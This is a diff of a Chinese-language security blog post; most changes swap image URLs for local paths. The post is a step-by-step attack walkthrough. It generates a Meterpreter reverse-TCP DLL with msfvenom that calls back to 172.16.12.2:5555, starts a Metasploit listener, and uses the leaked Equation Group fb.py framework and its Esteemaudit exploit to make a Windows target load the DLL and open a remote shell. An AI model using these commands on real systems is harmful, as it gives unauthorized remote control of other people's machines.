@@ -18,18 +18,20 @@ tags: 网络安全
 #### 第一步：生成可执行的恶意dll文件
 0x01
 首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：
-![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg "1.jpg")
+![1.jpg](post162/1.jpg)
 0x02
 执行命令：
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll >s.dll
 ```
 在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell
 0x03
 点击xshell如图位置
-![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg "3.jpg")
+![3.jpg](post162/3.jpg)
 打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图
-![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg "4.jpg")
+![4.jpg](post162/4.jpg)
+
 #### 第二步：配置kali使得kali处于监听状态
 0x01
 依次输入命令
@@ -42,19 +44,20 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 exploit
 ```
 看到如图即说明配置成功
-![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg "2.jpg")
+![2.jpg](post162/2.jpg)
 这时就可以将xshell最小化，等后边再用
+
 #### 第三步：使用方程式工具包进行攻击
 0x01
 将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为"listeningposts"的文件夹，如图，不然运行会报错
-![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg "5.jpg")
+![5.jpg](post162/5.jpg)
 0x02
 打开命令提示符，输入
 ```
 C:\win\fb.py
 ```
 然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图
-![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/1.jpg "1.jpg")
+![1.jpg](post162/1-16273800337215.jpg)
 最后敲击回车
 0x03
 显示出`fb >`之后输入命令
@@ -63,13 +66,13 @@ use Esteemaudit
 ```
 使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可
 （设置监听还是连接、系统位数、系统版本）
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/2.jpg "2.jpg")
+![2.jpg](post162/2-16273801063656.jpg)
 （回拨IP以及端口，端口号可以任意设置）
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/3.jpg "3.jpg")
+![3.jpg](post162/3-16273801178697.jpg)
 （配置DLL路径，需要改为实际路径）
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/4.jpg "4.jpg")
+![4.jpg](post162/4-16273801287108.jpg)
 之后几个回车即可看到连接成功，如图
-![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/5.jpg "5.jpg")
+![5.jpg](post162/5-16273801405719.jpg)
 0x04
 接着输入命令
 ```
